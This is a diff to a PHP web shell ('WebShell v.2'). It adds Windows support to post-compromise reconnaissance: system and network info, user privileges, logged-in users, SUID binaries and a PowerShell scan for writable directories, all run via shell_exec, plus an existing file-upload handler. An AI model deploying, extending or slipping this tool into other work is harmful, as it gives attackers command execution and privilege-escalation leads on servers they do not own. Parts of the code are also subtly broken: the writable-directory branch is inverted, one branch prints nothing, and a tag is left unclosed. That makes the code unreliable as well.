@@ -149,6 +149,12 @@ code, pre {
 echo '<body style="background-color:#424242;">';
 ?>
 
+<?php
+function isWindows()
+{
+    return strtoupper(substr(PHP_OS, 0, 3)) === 'WIN';
+}
+?>
 
 <!-- Authenticated -->
 <font style="float:left;" color="#F1F1F1"><b>WebShell v.2 <:~ </b></font><br /><br />
@@ -177,40 +183,72 @@ echo '<body style="background-color:#424242;">';
 <br><br>
 <b>Kernel & OS Info</b>
 <?php
-$uname = shell_exec("uname -a;" .
-  "awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
-echo "<pre>$uname</pre>";
+  if (isWindows()){
+      $uname = shell_exec("systeminfo");
+      echo"<pre>$uname<pre>";
+  }else {
+    $uname = shell_exec("uname -a;" .
+    "awk -F= '/^(PRETTY_NAME|BUILD_ID)=/ { gsub(/\"/, \"\", \$2); print \$1\": \"\$2 }' /etc/os-release");
+    echo "<pre>$uname</pre>";
+  }
 ?>
 
 
 <b>Network interfaces</b>
 <?php
-$ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
-echo "<pre>$ip_addr</pre>";
+if (isWindows()){
+  $ip_addr = shell_exec("ipconfig");
+  echo "<pre>$ip_addr</pre>";
+}else{
+  $ip_addr = shell_exec("ip addr | grep inet | grep -v inet6 | awk '{print $2}' | grep -v 127");
+  echo "<pre>$ip_addr</pre>";
+}
 ?>
 
 <b>disks</b>
 <?php
-$disk = shell_exec("df -h");
-echo "<pre>$disk</pre>";
+if (!isWindows()){
+  $disk = shell_exec("df -h");
+  echo "<pre>$disk</pre>";
+  }
+else {
+  $disk = shell_exec('powershell "Get-PSDrive -PSProvider FileSystem"');
+  echo "<pre>$disk</pre>";
+}
 ?>
 
 <b>User info</b>
 <?php
-$user = shell_exec("whoami; id");
-echo "<pre>$user</pre>";
+if (!isWindows()){
+  $user = shell_exec("whoami; id");
+  echo "<pre>$user</pre>";
+}
+else{
+  $user = shell_exec("whoami || whoami /priv");
+  echo "<pre>$user</pre>";
+}
 ?>
 
 <b> Connected Users </b>
 <?php
-$users = shell_exec("who -u");
-echo "<pre>$users</pre>";
+if (!isWindows()){
+  $users = shell_exec("who -u");
+  echo "<pre>$users</pre>";
+}else{
+  $users = shell_exec("query user");
+  echo "<pre>$users</pre>";
+}
 ?>
 
 <b>SUIDS</b>
 <?php
-$SUIDS = shell_exec("find / -xdev -maxdepth 4 -perm -4000 -type f 2>/dev/null");
-echo "<pre>$SUIDS</pre>";
+if (!isWindows()){
+  $SUIDS = shell_exec("find / -xdev -maxdepth 4 -perm -4000 -type f 2>/dev/null");
+  echo "<pre>$SUIDS</pre>";
+}
+else {
+  echo "<pre> OS is windows no suids to be found </pre>";
+}
 ?>
 
 
@@ -246,12 +284,25 @@ echo "<pre>$pwd</pre>";
 
 <b> R/W dirs for you </b>
 <?php
-  $R_W_dirs = shell_exec(
+  if (isWindows()){
+    $R_W_dirs = shell_exec(
       "find / -xdev \\( -path /proc -o -path /sys -o -path /dev -o -path /run \\) " .
       "-prune -o -type d -perm -0002 -print 2>/dev/null"
   );
   echo "<pre>$R_W_dirs</pre>";
-    ?>
+  }
+  else{
+    $R_W_dirs = shell_exec("powershell Get-ChildItem C:\\ -Directory -Recurse -ErrorAction SilentlyContinue |
+ForEach-Object {
+    try {
+        $test = Join-Path $_.FullName \".__writetest\"
+        New-Item -Path $test -ItemType File -Force -ErrorAction Stop | Out-Null
+        Remove-Item $test -Force
+        $_.FullName
+    } catch {}
+}");
+  }
+  ?>
 </div>
 </form></fieldset>
 
@@ -280,3 +331,6 @@ if (isset($_FILES['file'])) {
 }
 ?>
 </div>
+
+
+
